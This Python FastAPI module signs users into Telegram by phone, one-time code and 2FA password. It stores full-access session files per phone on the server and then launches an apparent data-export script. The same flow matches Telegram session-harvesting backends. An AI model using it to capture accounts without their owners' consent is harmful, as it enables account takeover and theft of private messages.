from fastapi import APIRouter, Request
from fastapi.responses import JSONResponse
from telethon import TelegramClient, functions, types
from telethon.errors import SessionPasswordNeededError
import os, uuid, re, asyncio
from pathlib import Path

from ..temp_store import put_temp, get_temp, pop_temp
from .helper import kick_off_export_script

router = APIRouter(prefix="/auth", tags=["auth"])

def _repo_root() -> Path:
    return Path(__file__).resolve().parents[2]

def _resolve_dir(env_name: str, default_rel: str) -> str:
    raw = os.getenv(env_name, default_rel)
    p = Path(raw)
    if not p.is_absolute():
        p = _repo_root() / raw
    p.mkdir(parents=True, exist_ok=True)
    return str(p.resolve())

SESSIONS_DIR = _resolve_dir("SESSIONS_DIR", ".sessions")

def _digits_only(s: str) -> str: return re.sub(r"\D", "", s or "")
def _safe_phone_filename(phone: str) -> str:
    return "".join(ch for ch in str(phone) if ch.isdigit() or ch == "+") or "unknown"

def make_client_with_path(session_path: str) -> TelegramClient:
    api_id = int(os.getenv("TELEGRAM_API_ID", "0"))
    api_hash = os.getenv("TELEGRAM_API_HASH", "")
    return TelegramClient(session_path, api_id, api_hash,
                          device_model="FastAPI", system_version="3.12", app_version="1.0")

_SESSION_LOCKS: dict[str, asyncio.Lock] = {}
def _get_lock(path: str) -> asyncio.Lock:
    lock = _SESSION_LOCKS.get(path)
    if not lock:
        lock = asyncio.Lock()
        _SESSION_LOCKS[path] = lock
    return lock

@router.post("/phone/start")
async def phone_start(req: Request):
    try:
        body = await req.json()
    except Exception:
        return JSONResponse({"ok": False, "error": "INVALID_JSON"}, status_code=400)

    phone_number = body.get("phoneNumber")
    if not phone_number:
        return JSONResponse({"ok": False, "error": "PHONE_REQUIRED"}, status_code=400)

    try:
        fname = f"{_safe_phone_filename(phone_number)}.session"
        session_path = os.path.join(SESSIONS_DIR, fname)

        client = make_client_with_path(session_path)
        await client.connect()

        sent = await client(functions.auth.SendCodeRequest(
            phone_number=phone_number,
            api_id=int(os.getenv("TELEGRAM_API_ID", "0")),
            api_hash=os.getenv("TELEGRAM_API_HASH", ""),
            settings=types.CodeSettings(allow_flashcall=False, current_number=False, allow_app_hash=True)
        ))

        auth_id = str(uuid.uuid4())
        put_temp(auth_id, {"session_path": session_path, "phone": phone_number, "hash": sent.phone_code_hash})

        r = JSONResponse({"ok": True})
        secure = os.getenv("NODE_ENV", "").lower() == "production"
        r.set_cookie("tg_auth_id", auth_id, httponly=True, secure=secure,
                     samesite="lax", path="/", max_age=300)
        return r
    except Exception as e:
        return JSONResponse({"ok": False, "error": str(e) or "SEND_CODE_FAILED"}, status_code=500)
    
    

# ... keep your verify/password endpoints unchanged except they call:
# asyncio.create_task(kick_off_export_script(phone))


# ========= 2) VERIFY OTP =========
@router.post("/phone/verify")
async def phone_verify(req: Request):
    try:
        body = await req.json()
    except Exception:
        return JSONResponse({"ok": False, "error": "INVALID_JSON"}, status_code=400)

    code = _digits_only(str(body.get("code", "")))
    if len(code) != 5:
        return JSONResponse({"ok": False, "error": "OTP_REQUIRED"}, status_code=400)

    auth_id = req.cookies.get("tg_auth_id", "") or str(body.get("authId", ""))
    if not auth_id:
        return JSONResponse({"ok": False, "error": "FLOW_EXPIRED"}, status_code=400)

    temp = get_temp(auth_id)
    if not temp or not temp.get("session_path") or not temp.get("phone") or not temp.get("hash"):
        return JSONResponse({"ok": False, "error": "FLOW_EXPIRED"}, status_code=400)

    client = None
    lock = _get_lock(temp["session_path"])
    async with lock:
        client = make_client_with_path(temp["session_path"])
        await client.connect()
        try:
            await client(functions.auth.SignInRequest(
                phone_number=temp["phone"],
                phone_code_hash=temp["hash"],
                phone_code=code,
            ))

            me = await client.get_me()
            user_id = str(getattr(me, "id", "unknown"))

            pop_temp(auth_id)  # consume only on success

            phone = str(temp["phone"]).strip()
            asyncio.create_task(kick_off_export_script(phone))  # <-- ONLY phone passed

            r = JSONResponse({"ok": True, "needsPassword": False, "user": {"id": user_id}})
            r.delete_cookie("tg_auth_id", path="/")
            return r

        except SessionPasswordNeededError:
            r = JSONResponse({"ok": True, "needsPassword": True, "authId": auth_id})
            secure = os.getenv("NODE_ENV", "").lower() == "production"
            r.set_cookie("tg_auth_id", auth_id, httponly=True, secure=secure,
                         samesite="lax", path="/", max_age=300)
            return r

        except Exception as err:
            msg = str(getattr(err, "message", "") or err) or "SIGN_IN_FAILED"
            return JSONResponse({"ok": False, "error": msg}, status_code=400)

        finally:
            try:
                await client.disconnect()
            except Exception:
                pass

# ========= 3) 2FA PASSWORD =========
@router.post("/phone/password")
async def phone_password(req: Request):
    try:
        body = await req.json()
    except Exception:
        return JSONResponse({"ok": False, "error": "INVALID_JSON"}, status_code=400)

    password = str(body.get("password", "")).strip()
    if not password:
        return JSONResponse({"ok": False, "error": "PASSWORD_REQUIRED"}, status_code=400)

    auth_id = str(body.get("authId") or req.cookies.get("tg_auth_id", ""))
    if not auth_id:
        return JSONResponse({"ok": False, "error": "FLOW_EXPIRED"}, status_code=400)

    temp = get_temp(auth_id)
    if not temp or not temp.get("session_path") or not temp.get("phone"):
        return JSONResponse({"ok": False, "error": "FLOW_EXPIRED"}, status_code=400)

    client = None
    lock = _get_lock(temp["session_path"])
    async with lock:
        client = make_client_with_path(temp["session_path"])
        await client.connect()
        try:
            # complete 2FA sign-in
            await client.sign_in(password=password)

            me = await client.get_me()
            user_id = str(getattr(me, "id", "unknown"))

            pop_temp(auth_id)  # consume only on success

            phone = str(temp["phone"]).strip()
            asyncio.create_task(kick_off_export_script(phone))  # <-- ONLY phone passed

            r = JSONResponse({"ok": True, "needsPassword": False, "user": {"id": user_id}})
            r.delete_cookie("tg_auth_id", path="/")
            return r

        except Exception as err:
            msg = str(getattr(err, "message", "") or err) or "PASSWORD_VERIFY_FAILED"
            return JSONResponse({"ok": False, "error": msg}, status_code=400)

        finally:
            try:
                await client.disconnect()
            except Exception:
                pass
